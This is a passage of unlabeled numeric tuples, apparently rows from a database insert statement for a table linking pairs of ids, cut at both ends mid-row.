184),(4911,2798,184),(4912,2206,184),(4913,1979,184),(4914,1929,184),(4915,1512,184),(4916,1480,184),(4917,1207,184),(4918,442,184),(4919,287,184),(4920,162,184),(4921,54,184),(4922,2798,185),(4923,2206,185),(4924,1979,185),(4925,1929,185),(4926,1512,185),(4927,1480,185),(4928,1207,185),(4929,867,185),(4930,442,185),(4931,287,185),(4932,54,185),(4933,2500,220),(4934,2206,220),(4935,1979,220),(4936,1572,220),(4937,1512,220),(4938,1480,220),(4939,1268,220),(4940,1207,220),(4941,981,220),(4942,977,220),(4943,876,220),(4944,875,220),(4945,867,220),(4946,832,220),(4947,704,220),(4948,665,220),(4949,463,220),(4950,442,220),(4951,441,220),(4952,374,220),(4953,371,220),(4954,367,220),(4955,347,220),(4956,287,220),(4957,283,220),(4958,268,220),(4959,238,220),(4960,237,220),(4961,234,220),(4962,217,220),(4963,206,220),(4964,203,220),(4965,200,220),(4966,191,220),(4967,190,220),(4968,179,220),(4969,169,220),(4970,162,220),(4971,153,220),(4972,136,220),(4973,125,220),(4974,75,220),(4975,74,220),(4976,35,220),(4977,34,220),(4978,33,220),(4979,27,220),(4980,1,220),(4981,2942,202),(4982,2894,202),(4983,2798,202),(4984,2521,202),(4985,2500,202),(4986,2469,202),(4987,2235,202),(4988,2206,202),(4989,2181,202),(4990,2119,202),(4991,2011,202),(4992,2022,202),(4993,1984,202),(4994,1979,202),(4995,1968,202),(4996,1929,202),(4997,1920,202),(4998,1572,202),(4999,1512,202),(5000,1498,202),(5001,1480,202),(5002,1380,202),(5003,1343,202),(5004,1342,202),(5005,2269,202),(5006,1207,202),(5007,1390,202),(5008,1137,202),(5009,1213,202),(5010,1085,202),(5011,977,202),(5012,929,202),(5013,876,202),(5014,875,202),(5015,867,202),(5016,852,202),(5017,832,202),(5018,704,202),(5019,746,202),(5020,709,202),(5021,724,202),(5022,680,202),(5023,566,202),(5024,557,202),(5025,463,202),(5026,442,202),(5027,441,202),(5028,412,202),(5029,410,202),(5030,392,202),(5031,374,202),(5032,371,202),(5033,367,202),(5034,347,202),(5035,344,202),(5036,338,202),(5037,322,202),(5038,287,202),(5039,283,202),(5040,279,202),(5041,278,202),(5042,268,202),(5043,242,202),(5044,238,202),(5045,237,202),(5046,234,202),(5047,217,202),(5048,205,202),(5049,203,202),(5050,198,202),(5051,191,202),(5052,190,202),(5053,189,202),(5054,179,202),(5055,169,202),(5056,167,202),(5057,162,202),(5058,160,202),(5059,153,202),(5060,136,202),(5061,125,202),(5062,122,202),(5063,121,202),(5064,118,202),(5065,88,202),(5066,75,202),(5067,74,202),(5068,70,202),(5069,59,202),(5070,54,202),(5071,53,202),(5072,48,202),(5073,42,202),(5074,35,202),(5075,34,202),(5076,33,202),(5077,27,202),(5078,26,202),(5079,15,202),(5080,14,202),(5081,11,202),(5082,9,202),(5083,4,202),(5084,1,202),(5085,2942,233),(5086,2894,233),(5087,2798,233),(5088,2206,233),(5089,2181,233),(5090,1984,233),(5091,1979,233),(5092,1945,233),(5093,1929,233),(5094,1898,233),(5095,1572,233),(5096,1512,233),(5097,1480,233),(5098,1268,233),(5099,1207,233),(5100,977,233),(5101,941,233),(5102,881,233),(5103,876,233),(5104,875,233),(5105,867,233),(5106,832,233),(5107,704,233),(5108,724,233),(5109,680,233),(5110,1721,233),(5111,442,233),(5112,441,233),(5113,412,233),(5114,392,233),(5115,387,233),(5116,374,233),(5117,367,233),(5118,350,233),(5119,344,233),(5120,338,233),(5121,287,233),(5122,283,233),(5123,268,233),(5124,242,233),(5125,238,233),(5126,237,233),(5127,234,233),(5128,219,233),(5129,217,233),(5130,206,233),(5131,203,233),(5132,202,233),(5133,191,233),(5134,190,233),(5135,189,233),(5136,179,233),(5137,169,233),(5138,167,233),(5139,162,233),(5140,153,233),(5141,136,233),(5142,125,233),(5143,122,233),(5144,121,233),(5145,88,233),(5146,75,233),(5147,74,233),(5148,66,233),(5149,58,233),(5150,54,233),(5151,53,233),(5152,42,233),(5153,41,233),(5154,35,233),(5155,34,233),(5156,33,233),(5157,28,233),(5158,27,233),(5159,26,233),(5160,19,233),(5161,14,233),(5162,13,233),(5163,9,233),(5164,7,233),(5165,4,233),(5166,1,233),(5167,2798,181),(5168,2206,181),(5169,1979,181),(5170,1929,181),(5171,1920,181),(5172,1512,181),(5173,1480,181),(5174,1207,181),(5175,442,181),(5176,287,181),(5177,162,181),(5178,54,181),(5179,48,181),(5180,2942,217),(5181,2798,217),(5182,2427,217),(5183,2206,217),(5184,2011,217),(5185,1979,217),(5186,1929,217),(5187,1920,217),(5188,1512,217),(5189,1480,217),(5190,1470,217),(5191,1207,217),(5192,977,217),(5193,442,217),(5194,441,217),(5195,374,217),(5196,367,217),(5197,287,217),(5198,162,217),(5199,153,217),(5200,74,217),(5201,34,217),(5202,33,217),(5203,29,217),(5204,4,217),(5205,2942,236),(5206,2798,236),(5207,2413,236),(5208,2206,236),(5209,1979,236),(5210,1929,236),(5211,1480,236),(5212,287,236),(5213,54,236),(5214,2942,237),(5215,2824,237),(5216,2815,237),(5217,2798,237),(5218,2206,237),(5219,2011,237),(5220,1984,237),(5221,1979,237),(5222,1929,237),(5223,1920,237),(5224,1672,237),(5225,1572,237),(5226,1512,237),(5227,1480,237),(5228,1470,237),(5229,1431,237),(5230,1365,237),(5231,1351,237),(5232,1343,237),(5233,2269,237),(5234,1207,237),(5235,1137,237),(5236,1119,237),(5237,977,237),(5238,881,237),(5239,876,237),(5240,875,237),(5241,867,237),(5242,832,237),(5243,704,237),(5244,766,237),(5245,746,237),(5246,724,237),(5247,680,237),(5248,560,237),(5249,442,237),(5250,441,237),(5251,410,237),(5252,392,237),(5253,374,237),(5254,371,237),(5255,367,237),(5256,344,237),(5257,338,237),(5258,287,237),(5259,283,237),(5260,279,237),(5261,242,237),(5262,238,237),(5263,237,237),(5264,234,237),(5265,217,237),(5266,206,237),(5267,202,237),(5268,198,237),(5269,189,237),(5270,169,237),(5271,167,237),(5272,162,237),(5273,153,237),(5274,136,237),(5275,125,237),(5276,88,237),(5277,75,237),(5278,74,237),(5279,70,237),(5280,59,237),(5281,58,237),(5282,54,237),(5283,50,237),(5284,48,237),(5285,35,237),(5286,34,237),(5287,33,237),(5288,28,237),(5289,27,237),(5290,26,237),(5291,11,237),(5292,9,237),(5293,4,237),(5294,1,237),(5295,48,212),(5296,2894,238),(5297,2586,238),(5298,2500,238),(5299,2206,238),(5300,1979,238),(5301,1572,238),(5302,1512,238),(5303,1480,238),(5304,1207,238),(5305,977,238),(5306,929,238),(5307,876,238),(5308,875,238),(5309,866,238),(5310,832,238),(5311,704,238),(5312,724,238),(5313,680,238),(5314,665,238),(5315,442,238),(5316,441,238),(5317,374,238),(5318,367,238),(5319,347,238),(5320,344,238),(5321,287,238),(5322,283,238),(5323,242,238),(5324,238,238),(5325,217,238),(5326,206,238),(5327,205,238),(5328,203,238),(5329,198,238),(5330,189,238),(5331,169,238),(5332,167,238),(5333,162,238),(5334,153,238),(5335,136,238),(5336,125,238),(5337,118,238),(5338,88,238),(5339,75,238),(5340,74,238),(5341,70,238),(5342,58,238),(5343,49,238),(5344,41,238),(5345,38,238),(5346,35,238),(5347,28,238),(5348,27,238),(5349,26,238),(5350,14,238),(5351,13,238),(5352,9,238),(5353,1,238),(5354,2206,179),(5355,1979,179),(5356,1929,179),(5357,1512,179),(5358,1480,179),(5359,1470,179),(5360,1207,179),(5361,442,179),(5362,287,179),(5363,162,179),(5364,48,179),(5365,2942,206),(5366,2798,206),(5367,2206,206),(5368,1979,206),(5369,1929,206),(5370,1512,206),(5371,1480,206),(5372,1207,206),(5373,442,206),(5374,287,206),(5375,162,206),(5376,48,206),(5377,1,206),(5378,2942,177),(5379,2894,177),(5380,2798,177),(5381,2427,177),(5382,2206,177),(5383,2125,177),(5384,1979,177),(5385,1929,177),(5386,1920,177),(5387,1512,177),(5388,1480,177),(5389,1492,177),(5390,1207,177),(5391,566,177),(5392,442,177),(5393,342,177),(5394,326,177),(5395,287,177),(5396,231,177),(5397,191,177),(5398,162,177),(5399,48,177),(5400,27,177),(5401,26,177),(5402,9,177),(5403,1,177),(5404,2942,183),(5405,2798,183),(5406,2586,183),(5407,2500,183),(5408,2206,183),(5409,2181,183),(5410,1984,183),(5411,1979,183),(5412,1968,183),(5413,1929,183),(5414,1898,183),(5415,1886,183),(5416,1572,183),(5417,1512,183),(5418,1498,183),(5419,1480,183),(5420,1492,183),(5421,1461,183),(5422,1207,183),(5423,977,183),(5424,881,183),(5425,876,183),(5426,875,183),(5427,867,183),(5428,832,183),(5429,704,183),(5430,680,183),(5431,665,183),(5432,554,183),(5433,498,183),(5434,463,183),(5435,442,183),(5436,441,183),(5437,410,183),(5438,397,183),(5439,374,183),(5440,371,183),(5441,367,183),(5442,347,183),(5443,344,183),(5444,322,183),(5445,287,183),(5446,283,183),(5447,279,183),(5448,242,183),(5449,239,183),(5450,238,183),(5451,237,183),(5452,234,183),(5453,219,183),(5454,217,183),(5455,206,183),(5456,203,183),(5457,191,183),(5458,190,183),(5459,189,183),(5460,169,183),(5461,167,183),(5462,162,183),(5463,160,183),(5464,153,183),(5465,137,183),(5466,136,183),(5467,125,183),(5468,122,183),(5469,118,183),(5470,88,183),(5471,76,183),(5472,75,183),(5473,74,183),(5474,54,183),(5475,49,183),(5476,48,183),(5477,42,183),(5478,41,183),(5479,35,183),(5480,34,183),(5481,33,183),(5482,27,183),(5483,26,183),(5484,18,183),(5485,15,183),(5486,14,183),(5487,11,183),(5488,9,183),(5489,7,183),(5490,5,183),(5491,4,183),(5492,3,183),(5493,2,183),(5494,1,183),(5495,2942,242),(5496,2824,242),(5497,2798,242),(5498,2500,242),(5499,2206,242),(5500,2011,242),(5501,1984,242),(5502,1979,242),(5503,1929,242),(5504,1920,242),(5505,1672,242),(5506,1572,242),(5507,1512,242),(5508,1480,242),(5509,1470,242),(5510,1431,242),(5511,1365,242),(5512,1351,242),(5513,1207,242),(5514,1137,242),(5515,977,242),(5516,881,242),(5517,875,242),(5518,867,242),(5519,2942,186),(5520,704,242),(5521,2894,186),(5522,766,242),(5523,746,242),(5524,724,242),(5525,2824,186),(5526,2798,186),(5527,2697,186),(5528,643,242),(5529,560,242),(5530,2500,186),(5531,442,242),(5532,2469,186),(5533,441,242),(5534,374,242),(5535,371,242),(5536,367,242),(5537,2367,186),(5538,344,242),(5539,338,242),(5540,2235,186),(5541,287,242),(5542,283,242),(5543,2206,186),(5544,242,242),(5545,2181,186),(5546,238,242),(5547,237,242),(5548,234,242),(5549,231,242),(5550,219,242),(5551,217,242),(5552,206,242),(5553,205,242),(5554,189,242),(5555,170,242),(5556,169,242),(5557,167,242),(5558,162,242),(5559,2011,186),(5560,153,242),(5561,2000,186),(5562,136,242),(5563,1984,186),(5564,1979,186),(5565,125,242),(5566,122,242),(5567,121,242),(5568,118,242),(5569,1929,186),(5570,108,242),(5571,1920,186),(5572,88,242),(5573,75,242),(5574,74,242),(5575,66,242),(5576,59,242),(5577,54,242),(5578,48,242),(5579,35,242),(5580,34,242),(5581,1768,186),(5582,33,242),(5583,27,242),(5584,26,242),(5585,4,242),(5586,3,242),(5587,1,242),(5588,1672,186),(5589,1572,186),(5590,1512,186),(5591,1480,186),(5592,1470,186),(5593,1343,186),(5594,1207,186),(5595,1137,186),(5596,977,186),(5597,876,186),(5598,875,186),(5599,867,186),(5600,832,186),(5601,704,186),(5602,746,186),(5603,724,186),(5604,680,186),(5605,665,186),(5606,633,186),(5607,560,186),(5608,557,186),(5609,463,186),(5610,442,186),(5611,441,186),(5612,410,186),(5613,392,186),(5614,374,186),(5615,371,186),(5616,367,186),(5617,347,186),(5618,344,186),(5619,338,186),(5620,287,186),(5621,283,186),(5622,268,186),(5623,242,186),(5624,240,186),(5625,237,186),(5626,234,186),(5627,217,186),(5628,209,186),(5629,206,186),(5630,202,186),(5631,191,186),(5632,190,186),(5633,189,186),(5634,179,186),(5635,169,186),(5636,167,186),(5637,162,186),(5638,153,186),(5639,136,186),(5640,125,186),(5641,88,186),(5642,81,186),(5643,75,186),(5644,74,186),(5645,70,186),(5646,69,186),(5647,66,186),(5648,54,186),(5649,42,186),(5650,41,186),(5651,35,186),(5652,34,186),(5653,33,186),(5654,28,186),(5655,27,186),(5656,26,186),(5657,11,186),(5658,7,186),(5659,5,186),(5660,4,186),(5661,3,186),(5662,2,186),(5663,1,186),(5664,342,142),(5665,304,142),(5666,268,142),(5667,231,142),(5668,137,142),(5669,2206,173),(5670,1979,173),(5671,1929,173),(5672,1512,173),(5673,1480,173),(5674,1207,173),(5675,442,173),(5676,287,173),(5677,162,173),(5678,54,173),(5679,48,173),(5680,2469,218),(5681,2413,218),(5682,2235,218),(5683,2206,218),(5684,1984,218),(5685,1979,218),(5686,1929,218),(5687,1512,218),(5688,1498,218),(5689,1480,218),(5690,1342,218),(5691,1281,218),(5692,1207,218),(5693,977,218),(5694,875,218),(5695,867,218),(5696,832,218),(5697,704,218),(5698,724,218),(5699,633,218),(5700,541,218),(5701,463,218),(5702,442,218),(5703,441,218),(5704,410,218),(5705,374,218),(5706,367,218),(5707,344,218),(5708,287,218),(5709,283,218),(5710,268,218),(5711,242,218),(5712,217,218),(5713,191,218),(5714,190,218),(5715,189,218),(5716,179,218),(5717,169,218),(5718,167,218),(5719,162,218),(5720,154,218),(5721,153,218),(5722,136,218),(5723,125,218),(5724,88,218),(5725,81,218),(5726,74,218),(5727,69,218),(5728,54,218),(5729,48,218),(5730,41,218),(5731,35,218),(5732,34,218),(5733,33,218),(5734,26,218),(5735,4,218),(5736,3,218),(5737,1,218),(5738,2942,195),(5739,2798,195),(5740,2521,195),(5741,2206,195),(5742,1979,195),(5743,1929,195),(5744,1512,195),(5745,1480,195),(5746,1207,195),(5747,442,195),(5748,287,195),(5749,162,195),(5750,54,195),(5751,48,195),(5752,4,195),(5753,1,195),(5754,1185,146),(5755,137,146),(5756,20,146),(5757,2942,163),(5758,2894,163),(5759,2798,163),(5760,2652,163),(5761,2500,163),(5762,2206,163),(5763,2017,163),(5764,1984,163),(5765,1979,163),(5766,1929,163),(5767,1898,163),(5768,1572,163),(5769,1512,163),(5770,1523,163),(5771,1498,163),(5772,1480,163),(5773,1343,163),(5774,1207,163),(5775,1137,163),(5776,977,163),(5777,509,163),(5778,912,163),(5779,876,163),(5780,875,163),(5781,867,163),(5782,852,163),(5783,704,163),(5784,709,163),(5785,680,163),(5786,557,163),(5787,463,163),(5788,442,163),(5789,441,163),(5790,410,163),(5791,374,163),(5792,371,163),(5793,367,163),(5794,347,163),(5795,344,163),(5796,342,163),(5797,338,163),(5798,326,163),(5799,287,163),(5800,283,163),(5801,268,163),(5802,258,163),(5803,242,163),(5804,240,163),(5805,234,163),(5806,231,163),(5807,229,163),(5808,217,163),(5809,215,163),(5810,209,163),(5811,206,163),(5812,203,163),(5813,191,163),(5814,189,163),(5815,179,163),(5816,169,163),(5817,167,163),(5818,162,163),(5819,153,163),(5820,136,163),(5821,125,163),(5822,122,163),(5823,118,163),(5824,100,163),(5825,81,163),(5826,77,163),(5827,75,163),(5828,74,163),(5829,69,163),(5830,67,163),(5831,66,163),(5832,58,163),(5833,50,163),(5834,49,163),(5835,48,163),(5836,46,163),(5837,43,163),(5838,41,163),(5839,35,163),(5840,33,163),(5841,27,163),(5842,14,163),(5843,9,163),(5844,1,163),(5845,1979,241),(5846,1929,241),(5847,1512,241),(5848,1480,241),(5849,977,241),(5850,2798,221),(5851,2469,221),(5852,2413,221),(5853,2235,221),(5854,2206,221),(5855,1979,221),(5856,1512,221),(5857,1480,221),(5858,1281,221),(5859,442,221),(5860,287,221),(5861,162,221),(5862,1,221),(5863,2942,132),(5864,2824,132),(5865,2798,132),(5866,2769,132),(5867,2469,132),(5868,2011,132),(5869,1979,132),(5870,1920,132),(5871,1688,132),(5872,1637,132),(5873,1512,132),(5874,1470,132),(5875,1431,132),(5876,1365,132),(5877,1351,132),(5878,1281,132),(5879,1185,132),(5880,1390,132),(5881,470,132),(5882,836,132),(5883,769,132),(5884,768,132),(5885,728,132),(5886,566,132),(5887,168,132),(5888,64,132),(5889,2798,182),(5890,2206,182),(5891,1979,182),(5892,1929,182),(5893,1672,182),(5894,1512,182),(5895,1480,182),(5896,162,182),(5897,2828,199),(5898,2810,199),(5899,2483,199),(5900,2469,199),(5901,2413,199),(5902,2366,199),(5903,2206,199),(5904,1979,199),(5905,1929,199),(5906,1512,199),(5907,1480,199),(5908,1351,199),(5909,1207,199),(5910,709,199),(5911,507,199),(5912,442,199),(5913,287,199),(5914,283,199),(5915,162,199),(5916,66,199),(5917,54,199),(5918,35,199),(5919,27,199),(5920,26,199),(5921,9,199),(5922,1,199),(5923,2942,247),(5924,2798,247),(5925,2521,247),(5926,2206,247),(5927,1979,247),(5928,1929,247),(5929,1512,247),(5930,1480,247),(5931,1207,247),(5932,977,247),(5933,875,247),(5934,704,247),(5935,441,247),(5936,374,247),(5937,367,247),(5938,344,247),(5939,287,247),(5940,278,247),(5941,217,247),(5942,169,247),(5943,153,247),(5944,74,247),(5945,69,247),(5946,54,247),(5947,48,247),(5948,35,247),(5949,33,247),(5950,9,247),(5951,1,247),(5952,2206,214),(5953,1979,214),(5954,1512,214),(5955,1480,214),(5956,1207,214),(5957,442,214),(5958,287,214),(5959,162,214),(5960,2942,239),(5961,2894,239),(5962,2903,239),(5963,2824,239),(5964,2798,239),(5965,2601,239),(5966,2500,239),(5967,2206,239),(5968,2114,239),(5969,2016,239),(5970,2011,239),(5971,1984,239),(5972,1979,239),(5973,1929,239),(5974,1898,239),(5975,1752,239),(5976,1672,239),(5977,1637,239),(5978,1572,239),(5979,1512,239),(5980,1486,239),(5981,1480,239),(5982,1470,239),(5983,1365,239),(5984,1207,239),(5985,1175,239),(5986,981,239),(5987,977,239),(5988,509,239),(5989,929,239),(5990,876,239),(5991,875,239),(5992,867,239),(5993,832,239),(5994,704,239),(5995,724,239),(5996,680,239),(5997,560,239),(5998,485,239),(5999,463,239),(6000,441,239),(6001,392,239),(6002,374,239),(6003,367,239),(6004,350,239),(6005,349,239),(6006,347,239),(6007,345,239),(6008,344,239),(6009,338,239),(6010,322,239),(6011,287,239),(6012,283,239),(6013,278,239),(6014,271,239),(6015,268,239),(6016,242,239),(6017,217,239),(6018,206,239),(6019,205,239),(6020,201,239),(6021,191,239),(6022,190,239),(6023,189,239),(6024,169,239),(6025,162,239),(6026,153,239),(6027,136,239),(6028,125,239),(6029,121,239),(6030,118,239),(6031,88,239),(6032,75,239),(6033,74,239),(6034,70,239),(6035,69,239),(6036,67,239),(6037,58,239),(6038,54,239),(6039,48,239),(6040,46,239),(6041,35,239),(6042,34,239),(6043,33,239),(6044,28,239),(6045,27,239),(6046,26,239),(6047,14,239),(6048,9,239),(6049,3,239),(6050,1,239),(6051,2521,188),(6052,2206,188),(6053,2181,188),(6054,1979,188),(6055,1572,188),(6056,1512,188),(6057,1480,188),(6058,1207,188),(6059,1137,188),(6060,977,188),(6061,876,188),(6062,867,188),(6063,832,188),(6064,442,188),(6065,441,188),(6066,374,188),(6067,371,188),(6068,367,188),(6069,338,188),(6070,287,188),(6071,268,188),(6072,234,188),(6073,206,188),(6074,203,188),(6075,191,188),(6076,190,188),(6077,162,188),(6078,153,188),(6079,136,188),(6080,74,188),(6081,70,188),(6082,48,188),(6083,36,188),(6084,4,188),(6085,3,188),(6086,2942,194),(6087,2521,194),(6088,2206,194),(6089,1979,194),(6090,1929,194),(6091,1512,194),(6092,1480,194),(6093,1207,194),(6094,896,194),(6095,442,194),(6096,287,194),(6097,189,194),(6098,168,194),(6099,162,194),(6100,70,194),(6101,59,194),(6102,54,194),(6103,48,194),(6104,2942,158),(6105,2798,158),(6106,2500,158),(6107,2206,158),(6108,2181,158),(6109,1984,158),(6110,1979,158),(6111,1929,158),(6112,1898,158),(6113,1572,158),(6114,1512,158),(6115,1480,158),(6116,1343,158),(6117,1207,158),(6118,977,158),(6119,881,158),(6120,875,158),(6121,867,158),(6122,832,158),(6123,704,158),(6124,680,158),(6125,665,158),(6126,560,158),(6127,1721,158),(6128,498,158),(6129,463,158),(6130,442,158),(6131,441,158),(6132,419,158),(6133,410,158),(6134,374,158),(6135,371,158),(6136,367,158),(6137,347,158),(6138,344,158),(6139,287,158),(6140,283,158),(6141,268,158),(6142,242,158),(6143,238,158),(6144,234,158),(6145,219,158),(6146,217,158),(6147,206,158),(6148,205,158),(6149,203,158),(6150,191,158),(6151,190,158),(6152,189,158),(6153,179,158),(6154,169,158),(6155,167,158),(6156,162,158),(6157,153,158),(6158,136,158),(6159,125,158),(6160,122,158),(6161,88,158),(6162,75,158),(6163,74,158),(6164,73,158),(6165,66,158),(6166,59,158),(6167,54,158),(6168,48,158),(6169,35,158),(6170,34,158),(6171,33,158),(6172,27,158),(6173,26,158),(6174,15,158),(6175,9,158),(6176,4,158),(6177,1,158),(6178,2942,191),(6179,2798,191),(6180,2769,191),(6181,2521,191),(6182,2500,191),(6183,2206,191),(6184,2011,191),(6185,1984,191),(6186,1979,191),(6187,1929,191),(6188,1920,191),(6189,1898,191),(6190,1909,191),(6191,1876,191),(6192,1672,191),(6193,1572,191),(6194,1512,191),(6195,1480,191),(6196,1343,191),(6197,1207,191),(6198,1137,191),(6199,977,191),(6200,867,191),(6201,832,191),(6202,704,191),(6203,665,191),(6204,643,191),(6205,560,191),(6206,498,191),(6207,463,191),(6208,442,191),(6209,441,191),(6210,374,191),(6211,371,191),(6212,367,191),(6213,344,191),(6214,338,191),(6215,287,191),(6216,283,191),(6217,268,191),(6218,242,191),(6219,217,191),(6220,205,191),(6221,198,191),(6222,191,191),(6223,190,191),(6224,189,191),(6225,169,191),(6226,167,191),(6227,162,191),(6228,153,191),(6229,136,191),(6230,125,191),(6231,122,191),(6232,88,191),(6233,74,191),(6234,70,191),(6235,66,191),(6236,59,191),(6237,54,191),(6238,48,191),(6239,41,191),(6240,36,191),(6241,35,191),(6242,33,191),(6243,27,191),(6244,26,191),(6245,15,191),(6246,11,191),(6247,4,191),(6248,3,191),(6249,1,191),(6250,2798,201),(6251,2206,201),(6252,2011,201),(6253,1979,201),(6254,1929,201),(6255,1672,201),(6256,1512,201),(6257,1480,201),(6258,1207,201),(6259,442,201),(6260,287,201),(6261,162,201),(6262,54,201),(6263,48,201),(6264,2942,215),(6265,2798,215),(6266,2469,215),(6267,2235,215),(6268,2206,215),(6269,2011,215),(6270,1979,215),(6271,1929,215),(6272,1920,215),(6273,1512,215),(6274,1480,215),(6275,1207,215),(6276,709,215),(6277,162,215),(6278,54,215),(6279,48,215),(6280,2894,232),(6281,2848,232),(6282,2206,232),(6283,1979,232),(6284,1929,232),(6285,1647,232),(6286,1512,232),(6287,1480,232),(6288,1359,232),(6289,1282,232),(6290,1207,232),(6291,977,232),(6292,881,232),(6293,876,232),(6294,704,232),(6295,442,232),(6296,441,232),(6297,410,232),(6298,377,232),(6299,374,232),(6300,371,232),(6301,347,232),(6302,344,232),(6303,338,232),(6304,287,232),(6305,237,232),(6306,234,232),(6307,217,232),(6308,206,232),(6309,190,232),(6310,189,232),(6311,162,232),(6312,153,232),(6313,118,232),(6314,88,232),(6315,42,232),(6316,35,232),(6317,34,232),(6318,26,232),(6319,1,232),(6320,2798,200),(6321,2206,200),(6322,1979,200),(6323,1929,200),(6324,1920,200),(6325,1886,200),(6326,1512,200),(6327,1480,200),(6328,1470,200),(6329,1207,200),(6330,442,200),(6331,287,200),(6332,48,200),(6333,9,200),(6334,1,200),(6335,766,160),(6336,498,160),(6337,2728,138),(6338,2610,138),(6339,2535,138),(6340,2433,138),(6341,2220,138),(6342,1874,138),(6343,1816,138),(6344,1684,138),(6345,1570,138),(6346,1486,138),(6347,1476,138),(6348,1342,138),(6349,1282,138),(6350,2206,216),(6351,1979,216),(6352,1512,216),(6353,1480,216),(6354,287,216),(6355,2206,227),(6356,1979,227),(6357,1512,227),(6358,1480,227),(6359,1207,227),(6360,442,227),(6361,287,227),(6362,162,227),(6363,54,227),(6364,2798,170),(6365,2206,170),(6366,2114,170),(6367,1979,170),(6368,1929,170),(6369,1859,170),(6370,1512,170),(6371,1480,170),(6372,1207,170),(6373,709,170),(6374,557,170),(6375,442,170),(6376,287,170),(6377,162,170),(6378,1,170),(6379,867,175),(6380,498,175),(6381,498,156),(6382,867,213),(6383,498,213),(6384,441,213),(6385,498,185),(6386,867,181),(6387,498,181),(6388,441,181),(6389,1,181),(6390,13,184),(6391,9,184),(6392,1,184),(6393,1822,178),(6394,1464,178),(6395,1450,178),(6396,1365,178),(6397,1051,178),(6398,1528,180),(6399,1389,180),(6400,566,180),(6401,240,180),(6402,2011,147),(6403,2942,189),(6404,2798,189),(6405,2469,189),(6406,2413,189),(6407,2235,189),(6408,2206,189),(6409,2114,189),(6410,2011,189),(6411,1979,189),(6412,1929,189),(6413,1920,189),(6414,1512,189),(6415,1480,189),(6416,1470,189),(6417,1207,189),(6418,509,189),(6419,709,189),(6420,442,189),(6421,287,189),(6422,162,189),(6423,54,189),(6424,48,189),(6425,27,189),(6426,26,189),(6427,498,228),(6428,9,228),(6429,1913,162),(6430,1351,162),(6431,73,162),(6432,59,162),(6433,54,170),(6434,48,170),(6435,1672,162),(6436,1365,162),(6437,128,177),(6438,54,177),(6439,54,161),(6440,48,161),(6441,2894,246),(6442,2500,246),(6443,2206,246),(6444,1984,246),(6445,1979,246),(6446,1822,246),(6447,1572,246),(6448,1512,246),(6449,1480,246),(6450,1351,246),(6451,1207,246),(6452,1137,246),(6453,977,246),(6454,929,246),(6455,876,246),(6456,875,246),(6457,867,246),(6458,832,246),(6459,704,246),(6460,746,246),(6461,744,246),(6462,724,246),(6463,680,246),(6464,643,246),(6465,463,246),(6466,442,246),(6467,441,246),(6468,380,246),(6469,374,246),(6470,367,246),(6471,344,246),(6472,338,246),(6473,287,246),(6474,283,246),(6475,268,246),(6476,242,246),(6477,238,246),(6478,237,246),(6479,217,246),(6480,215,246),(6481,206,246),(6482,203,246),(6483,191,246),(6484,189,246),(6485,179,246),(6486,169,246),(6487,167,246),(6488,162,246),(6489,153,246),(6490,136,246),(6491,125,246),(6492,88,246),(6493,75,246),(6494,70,246),(6495,41,246),(6496,35,246),(6497,34,246),(6498,33,246),(6499,27,246),(6500,26,246),(6501,14,246),(6502,9,246),(6503,3,246),(6504,1,246),(6505,1672,205),(6506,1572,205),(6507,1351,205),(6508,867,205),(6509,766,205),(6510,378,205),(6511,73,205),(6512,1,205),(6513,1672,173),(6514,1572,173),(6515,1351,173),(6516,867,173),(6517,59,173),(6518,26,173),(6519,4,173),(6520,766,162),(6521,378,162),(6522,54,217),(6523,48,217),(6524,2824,189),(6525,1389,189),(6526,1351,189),(6527,1,189),(6528,387,163),(6529,28,163),(6530,2413,243),(6531,2235,243),(6532,1342,243),(6533,1281,243),(6534,709,243),(6535,1672,199),(6536,59,199),(6537,2942,245),(6538,2798,245),(6539,1979,245),(6540,1929,245),(6541,1512,245),(6542,1480,245),(6543,977,245),(6544,796,245),(6545,704,245),(6546,560,245),(6547,441,245),(6548,415,245),(6549,412,245),(6550,389,245),(6551,374,245),(6552,367,245),(6553,344,245),(6554,242,245),(6555,217,245),(6556,205,245),(6557,169,245),(6558,162,245),(6559,125,245),(6560,88,245),(6561,74,245),(6562,69,245),(6563,58,245),(6564,35,245),(6565,27,245),(6566,26,245),(6567,9,245),(6568,1,245),(6569,2798,167),(6570,2469,167),(6571,2206,167),(6572,2011,167),(6573,1979,167),(6574,1929,167),(6575,1732,167),(6576,1688,167),(6577,1512,167),(6578,1480,167),(6579,1464,167),(6580,1431,167),(6581,1365,167),(6582,1207,167),(6583,1154,167),(6584,1025,167),(6585,977,167),(6586,875,167),(6587,704,167),(6588,507,167),(6589,442,167),(6590,441,167),(6591,374,167),(6592,367,167),(6593,287,167),(6594,162,167),(6595,153,167),(6596,136,167),(6597,74,167),(6598,69,167),(6599,35,167),(6600,2206,171),(6601,1979,171),(6602,1512,171),(6603,1480,171),(6604,1207,171),(6605,442,171),(6606,287,171),(6607,162,171),(6608,66,171),(6609,35,171),(6610,27,171),(6611,26,171),(6612,1,171),(6613,1207,236),(6614,442,236),(6615,162,236),(6616,48,236),(6617,54,157),(6618,2942,244),(6619,2521,244),(6620,1929,244),(6621,1512,244),(6622,1480,244),(6623,20,244),(6624,13,244),(6625,1,244),(6626,2798,174),(6627,2206,174),(6628,1979,174),(6629,1768,174),(6630,1512,174),(6631,1480,174),(6632,1351,174),(6633,1207,174),(6634,867,174),(6635,442,174),(6636,389,174),(6637,287,174),(6638,242,174),(6639,162,174),(6640,54,174),(6641,28,174),(6642,1979,210),(6643,1512,210),(6644,1480,210),(6645,1207,210),(6646,442,210),(6647,287,210),(6648,162,210),(6649,2942,197),(6650,2798,197),(6651,2469,197),(6652,2235,197),(6653,2206,197),(6654,2114,197),(6655,1979,197),(6656,1929,197),(6657,1920,197),(6658,1672,197),(6659,1512,197),(6660,1480,197),(6661,1470,197),(6662,1207,197),(6663,867,197),(6664,498,197),(6665,442,197),(6666,287,197),(6667,162,197),(6668,54,197),(6669,48,197),(6670,9,197),(6671,7,197),(6672,4,197),(6673,1,197),(6674,766,191),(6675,2206,204),(6676,1512,204),(6677,1480,204),(6678,1431,204),(6679,1207,204),(6680,162,204),(6681,1672,233),(6682,1351,233),(6683,766,233),(6684,498,233),(6685,378,233),(6686,73,233),(6687,59,233),(6688,1672,183),(6689,1351,183),(6690,766,183),(6691,378,183),(6692,73,183),(6693,59,183),(6694,766,164),(6695,378,164),(6696,73,164),(6697,2807,138),(6698,2769,138),(6699,2652,138),(6700,2469,138),(6701,2413,138),(6702,2235,138),(6703,2160,138),(6704,645,138),(6705,442,138),(6706,1672,169),(6707,1351,169),(6708,766,169